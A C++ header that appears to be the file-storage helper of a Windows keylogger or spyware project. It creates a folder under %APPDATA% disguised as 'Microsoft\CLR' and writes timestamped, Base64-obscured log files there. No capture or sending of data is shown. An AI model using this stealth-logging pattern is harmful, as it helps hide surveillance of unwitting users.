#ifndef IO_H
#define IO_H
#include <string>
#include <cstdlib>
#include <fstream>
#include "windows.h"
#include "Helper.h"
#include "Base64.h"

namespace IO
{
    std::string GetOurPath(const bool append_separator=false)
    {
        std::string appdata_dir(getenv("APPDATA"));
        std::string full=appdata_dir+"\\Microsoft\\CLR";
        return full+(append_separator ? "\\":"");
    }
    bool MkoneDr(std::string path)
    {
        return (bool)CreateDirectory(path.c_str(),NULL) || GetLastError()==ERROR_ALREADY_EXISTS;
    }
    bool MKDir(std::string path)
    {
        for(char &c:path)
            if(c=='\\')
            {
                c='\0';
                if(!MkoneDr(path))
                    return false;
                c='\\';
            }
        return true;
    }
    template <typename T>
    std::string WriteLog(const T &t)
     {
         std::string path=GetOurPath(true);
         Helper::DateTime dt;
         std::string filename=dt.GetDateTimeString("_")+".log";
         try
         {
             std::ofstream file(path+filename);
             if(!file)return "";
             std::stringstream ss;
             ss<<"["<<dt.GetDateTimeString()<<"]"
               <<std::endl<<t<<std::endl;
             std::string data=Base64::EncryptB64(ss.str());
             file<<data;
             if(!file)return "";
             file.close();
             return filename;
         }
         catch(...)
         {
             return "";
         }
     }
}


#endif // IO_H
